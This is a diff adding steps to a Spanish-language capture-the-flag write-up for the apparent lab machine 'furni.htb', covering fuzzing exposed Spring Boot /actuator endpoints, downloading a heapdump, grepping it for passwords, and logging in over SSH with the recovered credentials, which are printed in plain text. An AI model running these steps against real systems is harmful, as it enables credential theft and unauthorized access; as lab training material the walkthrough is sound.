@@ -122,11 +122,70 @@
 
    <img width="910" height="672" alt="image" src="https://github.com/user-attachments/assets/ddc2285c-fc2e-4770-99f5-b0a2bde9c159" />
 
+### 11. Enumeación de rutas ocultas:
 
+    Tenemos que tener en cuenta que muchos frameworks modernos como **Spring Boot** exponen un conjunto de endpoints de monitoreo y administración bajo /actuator.
 
+    Por lo que ahora veremos si existe el panel de administrción de Spring Boot:
+
+    Primero creamos un pequeño wordlist para fuzzear posibles rutas sensibles:
+    
+    ```bash
+    echo -e "actuator\nactuator/env\nactuator/heapdump\nactuator/beans\nactuator/info\nactuator/metrics" > tiny.txt
+    ```
+
+    y luego lanzamos ´ffuf´ contra 'furni.htb´
+
+    ```bash
+    ffuf -u http://furni.htb/FUZZ -w tiny.txt -o ffuf_actuator.txt
+    ```
    
+   <img width="762" height="536" alt="image" src="https://github.com/user-attachments/assets/3f7db983-2ef9-4cdc-8735-3b67416ad60e" />
+
+   Aqui descubrimos que el backend está usando Spring Boot con el panel ´/actuator´ expuesto sin autenticación
+
+   Podemos ver que el endpoint más interesante es:
+
+   ´/actuator/heapdump´
 
 
+### 12. Descarga y el analisis del ´Heapdump´
 
+   Descargamos el archivo con curl:
    
+   ```bash
+    curl http://furni.htb/actuator/heapdump -o heapdump.bin
+   ```
+
+   <img width="652" height="107" alt="image" src="https://github.com/user-attachments/assets/2fdff3fe-8ae7-49ee-8d26-0e2564f54202" />
+
+   Una vez descargado, usamos strings para extraer cadenas legibles del binario y guardar la salida:
+   
+   <img width="441" height="62" alt="image" src="https://github.com/user-attachments/assets/40a4d4ab-813a-42dd-adee-821349f62dc4" />
+
+
+### 13. Extracción de credenciales
+
+
+   Analizamos el archivo con grep:
+
+   ```bash
+    grep -Ei 'password[ ]*[:=][ ]*[^[:space:]"]+' heap_strings.txt
+   ```
+
+   <img width="1640" height="131" alt="image" src="https://github.com/user-attachments/assets/d030b451-918d-44a4-9d3f-4e34ff155681" />
+
+   Obtenemos la siguiente entrada:
+
+   ```bash
+    {password=0sc@r190_S0l!dP@sswd, user=oscar190}
+   ```
+
+   Estas credenciales corresponden al usuario oscar190, lo cual fue confirmado con un acceso exitoso vía SSH:
+
+   ```bash
+    ssh oscar190@furni.htb
+   ```
+
+   <img width="957" height="768" alt="image" src="https://github.com/user-attachments/assets/a2f98c25-0dcb-4fee-8bfc-358b54d68262" />
 
